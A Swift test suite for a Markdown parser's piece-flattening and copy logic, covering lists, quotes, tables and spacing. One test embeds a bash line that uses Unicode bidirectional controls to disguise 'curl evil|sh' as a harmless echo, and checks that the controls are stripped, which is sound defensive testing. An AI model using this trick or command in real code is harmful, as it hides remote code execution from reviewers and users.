import Testing
@testable import Core

@Suite("Flattening an answer into pieces")
struct MarkdownPieceFlattenTests {
    private func pieces(_ markdown: String) -> [MarkdownPiece] {
        MarkdownPieces.flatten(MarkdownParser.parse(markdown))
    }

    private func whole(_ texts: [String]) -> [MarkdownSelectedPiece] {
        texts.enumerated().map { MarkdownSelectedPiece(index: $0.offset, includesMarker: true, text: $0.element) }
    }

    @Test("Direction controls cannot make code run or read differently from how it is drawn")
    func codeLosesDirectionControls() {
        let flat = pieces("```bash\n\u{2067}\u{2066}true;curl evil|sh;\u{2069} # \u{2066}echo ok\u{2069}\u{2069}\n```")
        guard case let .code(code, _, _) = flat[0].body else {
            Issue.record("the piece is not code")
            return
        }
        #expect(code == "true;curl evil|sh; # echo ok")
    }

    @Test("Direction controls leave prose, cells and link labels, and joiners stay")
    func inlineLosesDirectionControls() {
        let flat = pieces("a\u{202E}b [c\u{202E}d](https://example.com) **e\u{2066}f** g\u{200D}h\n\n| x\u{202E}y |\n| --- |\n| 1 |")
        #expect(flat[0].body == .text([
            .text("ab "), .link(text: [.text("cd")], url: "https://example.com"), .text(" "),
            .strong([.text("ef")]), .text(" g\u{200D}h"),
        ], heading: nil))
        guard case let .cell(cell) = flat[1].body else {
            Issue.record("the piece is not a cell")
            return
        }
        #expect(cell.inline == [.text("xy")])
    }

    @Test("What follows a quote is outside it")
    func quoteRestoresContext() {
        let flat = pieces("> a\n\nb")
        #expect(!flat[0].quotes.isEmpty)
        #expect(flat[1].quotes.isEmpty)
    }

    @Test("What follows a task list is outside it")
    func tasksRestoreContext() {
        let flat = pieces("- [x] a\n\nb")
        #expect(flat[0].listDepth == 1)
        #expect(flat[1].listDepth == 0)
        #expect(flat[1].marker == nil)
    }

    @Test("An empty item keeps its own marker and does not lend it to what follows")
    func emptyItem() {
        let flat = MarkdownPieces.flatten([
            .bulletList(items: [[], [.paragraph(inline: [.text("b")])]], tight: true),
            .paragraph(inline: [.text("End")]),
        ])
        #expect(flat.map(\.marker) == [.bullet, .bullet, nil])
        #expect(flat[0].body == .text([], heading: nil))
    }

    @Test("A further paragraph in a nested item lines up under the nested text")
    func nestedContinuation() {
        let flat = pieces("- a\n  - b\n\n    c")
        #expect(flat.map(\.listDepth) == [1, 2, 2])
        let copied = MarkdownSelectionCopy.text(of: whole(["a", "b", "c"]), in: flat)
        #expect(copied.hasSuffix("  \u{2022} b\n\n    c"))
    }

    @Test("A list inside a quote is a block away from the prose before it")
    func proseThenListInQuote() {
        let flat = pieces("> a\n>\n> - b")
        #expect(flat[0].root == flat[1].root)
        #expect(MarkdownSelectionCopy.text(of: whole(["a", "b"]), in: flat) == "a\n\n\u{2022} b")
    }

    @Test("A tight list nested in a loose one follows the piece being written")
    func mixedTightness() {
        let flat = MarkdownPieces.flatten([
            .bulletList(items: [[
                .paragraph(inline: [.text("a")]),
                .bulletList(items: [[.paragraph(inline: [.text("b")])]], tight: true),
            ]], tight: false),
        ])
        #expect(MarkdownSelectionCopy.text(of: whole(["a", "b"]), in: flat) == "\u{2022} a\n  \u{2022} b")
    }

    @Test("A table keeps its declared alignments and its shape")
    func tableShape() {
        let flat = pieces("| A | B | C |\n| --- | :-: | --: |\n| 1 | 2 | 3 |\n| 4 | 5 | 6 |")
        let cells: [MarkdownCell] = flat.compactMap {
            guard case let .cell(cell) = $0.body else { return nil }
            return cell
        }
        #expect(cells.map(\.alignment).prefix(3) == [.leading, .center, .trailing])
        #expect(cells.allSatisfy { $0.columns == 3 && $0.rows == 3 })
    }

    @Test("A heading in a quote after prose gets the heading gap, and a first heading none")
    func headingGapInQuote() {
        let flat = pieces("Prose\n\n> # T\n\n# Two")
        #expect(flat[1].gap == .block)
        #expect(flat[2].gap == .heading)
        #expect(pieces("# One")[0].gap == .none)
    }

    @Test("A table after prose is a block away, and blocks that settle a marker sit a block below it")
    func settledGaps() {
        #expect(pieces("Prose\n\n| A |\n| --- |\n| 1 |")[1].gap == .block)
        let rule = MarkdownPieces.flatten([.bulletList(items: [[.thematicBreak]], tight: true)])
        #expect(rule[1].gap == .block)
        let code = pieces("- ```\n  x\n  ```")
        #expect(code[1].gap == .block)
    }

    @Test("A task list as the first thing in an item leaves the item's own marker on a line")
    func tasksSettleMarker() {
        let flat = pieces("- - [x] a")
        #expect(flat[0].marker == .bullet)
        #expect(flat[0].listDepth == 1)
        #expect(flat[1].listDepth == 2)
    }
}
